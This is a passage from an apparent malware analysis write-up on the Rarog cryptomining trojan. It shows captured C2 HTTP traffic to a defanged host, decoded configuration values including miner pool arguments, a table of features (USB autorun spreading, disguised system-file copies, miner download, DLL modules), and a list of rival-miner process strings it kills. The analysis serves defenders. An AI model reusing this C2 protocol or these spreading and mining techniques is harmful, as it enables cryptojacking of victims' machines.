					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9ce541929245-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-2">2</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-4">4</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-6">6</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-8">8</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-10">10</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-12">12</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9ce541929245-14">14</div><div class="crayon-num" data-line="crayon-676268260c9ce541929245-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9ce541929245-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">4.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">check </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-7"><span class="crayon-i">id</span>=<span class="crayon-cn">250</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-8"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-9"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.10</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-10"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Tue</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">:</span><span class="crayon-cn">47</span><span class="crayon-sy">:</span><span class="crayon-cn">52</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">12</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9ce541929245-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9ce541929245-15"><span class="crayon-i">c3VjY2Vzcw</span>==</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Again, Rarog looks for a response of 'success'. Rarog continues to make the following POST request:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d0392432869" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /4.0/method/threads HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 0
Host: api.polotreck[.]xyz
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Tue, 20 Mar 2018 20:49:46 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 16
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
MjsxOzE7MTsyOw==</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d0392432869-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-2">2</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-4">4</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-6">6</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-8">8</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-10">10</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-12">12</div><div class="crayon-num" data-line="crayon-676268260c9d0392432869-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d0392432869-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d0392432869-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">4.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">threads </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-7"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-8"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.10</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-9"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Tue</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">:</span><span class="crayon-cn">49</span><span class="crayon-sy">:</span><span class="crayon-cn">46</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-10"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">16</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-12"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line" id="crayon-676268260c9d0392432869-13"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d0392432869-14"><span class="crayon-i">MjsxOzE7MTsyOw</span>==</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The decoded response by the C2 server is ‘2;1;1;1;2;’. This data is split via ‘;’ and the values are used to indicate whether certain Rarog features are enabled or not. The value of ‘1’ represents ‘On’, while anything else represents ‘Off’.</p>
<table align="center">
<tbody>
<tr>
<td width="67">Position</td>
<td width="107">Name</td>
<td width="450">Description</td>
</tr>
<tr>
<td width="67">0</td>
<td width="107">USB Devices</td>
<td width="450">Searches the machine for removable drives. Copies Rarog to the removable drive with the name of 'autorun.exe'. Also creates an 'autorun.inf' file in the same directory, which will execute 'autorun.exe' when loaded.</td>
</tr>
<tr>
<td width="67">1</td>
<td width="107">Helpers</td>
<td width="450">Creates the hidden 'C:\ProgramData\MicrosoftCorporation\Windows\Helpers\' directory, and copies Isass.exe to 'SecurityHeaIthService.exe', 'SystemldleProcess.exe', and 'winIogon.exe' in this directory.</td>
</tr>
<tr>
<td width="67">2</td>
<td width="107">Mining Status</td>
<td width="450">Makes a POST request to '/2.0/method/get' to retrieve a URL for a mining executable. This file is stored in the 'C:\ProgramData\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\' directory.</td>
</tr>
<tr>
<td width="67">3</td>
<td width="107">Miners Killer</td>
<td width="450">Makes a POST request to '/4.0/method/modules'. This provides a list of DLLs that are placed in the 'C:\ProgramData\MicrosoftCorporation\Windows\Modules\' folder. These DLLs are then loaded by Rarog. The DLLs in question are expected to have an export function named 'Instance'.</td>
</tr>
<tr>
<td width="67">4</td>
<td width="107">Task Manager</td>
<td width="450">This does not appear to be used by the malware.</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
When the ‘Mining Status’ option is enabled, and a miner is successfully downloaded from a remote server, Rarog will make the following request to the C2 server:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d1970423053" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /2.0/method/config HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 6
Host: api.polotreck[.]xyz
id=250
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Wed, 21 Mar 2018 16:55:38 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
Vary: Accept-Encoding
LW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NTU2MCAtdSBtb3JlMnNldEBwcm90b25tYWlsLmNvbSAtcCB4IC1rIC10IHtUSFJFQURTfQ==</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d1970423053-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-2">2</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-4">4</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-6">6</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-8">8</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-10">10</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-12">12</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-14">14</div><div class="crayon-num" data-line="crayon-676268260c9d1970423053-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d1970423053-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d1970423053-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">2.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">config </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-7"><span class="crayon-i">id</span>=<span class="crayon-cn">250</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-8"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-9"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.10</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-10"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Wed</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">21</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">:</span><span class="crayon-cn">55</span><span class="crayon-sy">:</span><span class="crayon-cn">38</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">108</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9d1970423053-15"><span class="crayon-i">Vary</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Accept</span>-<span class="crayon-e">Encoding</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d1970423053-16"><span class="crayon-i">LW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NTU2MCAtdSBtb3JlMnNldEBwcm90b25tYWlsLmNvbSAtcCB4IC1rIC10IHtUSFJFQURTfQ</span>==</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The response decodes to the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d3916632089" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
o xmr.pool.minergate[.]com:45560 -u more2set@protonmail[.]com -p x -k -t {THREADS}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d3916632089-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d3916632089-1"><span class="crayon-i">o</span><span class="crayon-h"> </span><span class="crayon-i">xmr</span><span class="crayon-sy">.</span><span class="crayon-i">pool</span><span class="crayon-sy">.</span><span class="crayon-i">minergate</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-i">com</span><span class="crayon-sy">:</span><span class="crayon-cn">45560</span><span class="crayon-h"> </span>-<span class="crayon-i">u</span><span class="crayon-h"> </span><span class="crayon-i">more2set</span><span class="crayon-sy">@</span><span class="crayon-i">protonmail</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span><span class="crayon-h"> </span>-<span class="crayon-e">p</span><span class="crayon-h"> </span><span class="crayon-e">x</span><span class="crayon-h"> </span>-<span class="crayon-e">k</span><span class="crayon-h"> </span>-<span class="crayon-e">t</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-i">THREADS</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>These parameters will be supplied to the mining program upon execution. Prior to running the miner, Rarog will check the running processes on the system for the following strings. Should they be encountered, the processes will be killed, and the executable will be deleted from the system.</p>
<ul>
<li>minergate</li>
<li>stratum</li>
<li>cryptonight</li>
<li>monerohash</li>
<li>nicehash</li>
<li>dwarfpool</li>
<li>suprnova</li>
<li>nanopool</li>
<li>xmrpool</li>
</ul>
<p>These strings represent common strings associated with mining pools used by individuals when mining various cryptocurrencies.<br />
Rarog will make the following request to determine how much of a percentage of the victim’s CPU to use for mining:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d5763319264" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /4.0/method/cores HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 6
Host: api.polotreck[.]xyz
id=250
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Wed, 21 Mar 2018 17:03:18 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 4
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
NTA=</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
